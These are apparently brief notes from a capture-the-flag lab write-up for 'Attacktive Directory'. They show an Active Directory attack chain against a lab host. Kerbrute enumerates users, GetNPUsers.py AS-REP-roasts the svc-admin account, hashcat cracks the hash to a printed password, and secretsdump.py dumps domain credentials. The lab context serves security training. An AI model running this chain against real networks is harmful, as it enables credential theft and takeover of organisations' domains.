# Attacktive Directory

> John Hammond | September 9th, 2020


--------------------------

```
10.10.177.247
```


```
~/go/bin/kerbrute  userenum --dc 10.10.177.247  -d spookysec.local userlist.txt

2020/09/03 12:40:58 >  [+] VALID USERNAME:	 james@spookysec.local
2020/09/03 12:41:02 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2020/09/03 12:41:07 >  [+] VALID USERNAME:	 James@spookysec.local
2020/09/03 12:41:08 >  [+] VALID USERNAME:	 robin@spookysec.local
2020/09/03 12:41:28 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2020/09/03 12:41:41 >  [+] VALID USERNAME:	 administrator@spookysec.local
2020/09/03 12:42:05 >  [+] VALID USERNAME:	 backup@spookysec.local
2020/09/03 12:42:16 >  [+] VALID USERNAME:	 paradox@spookysec.local
```



```
/opt/impacket/examples/GetNPUsers.py -request spookysec.local/svc-admin -no-pass

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e117df17daaca64fdf4ed2fa9e40f191$9cc0db80ae453b8081d1810c3b363013965a0f3d27fd59ff8dc70ccd2d2f1fd5e10d757d507f38cefb0630ce55f0b08aee453a1d67ef38818fc3d5e760192847e214f1b335d8c206b94eea59a018d8f5a895198936aceb548635790c3c4aa2bca3ae2b2dca1564f9d9f5cd6a5812cc07c9231ef9f55646508e408436757e689060a13f6f3d158e3ffee30ed88193dca42ca7c5cd52107562123c6e76c8fa00e5cea4a2bed4aad372771f2da78ae9a6edf705e11b91cfb29efb0977904fc59b67c808d32adeb875ca406639f92b9a6ef103fde9a2d454a99eaddd906c160117076dd8246440740fa4c25081c965176d81b42f
```

```
Kerberos 5 AS-REP etype 23
```

```
hashcat -m 18200 ticket.txt  --force passwordlist.txt
```

Password found to be `management2005`





```
/opt/impacket/examples/secretsdump.py  -just-dc backup@spookysec.local
```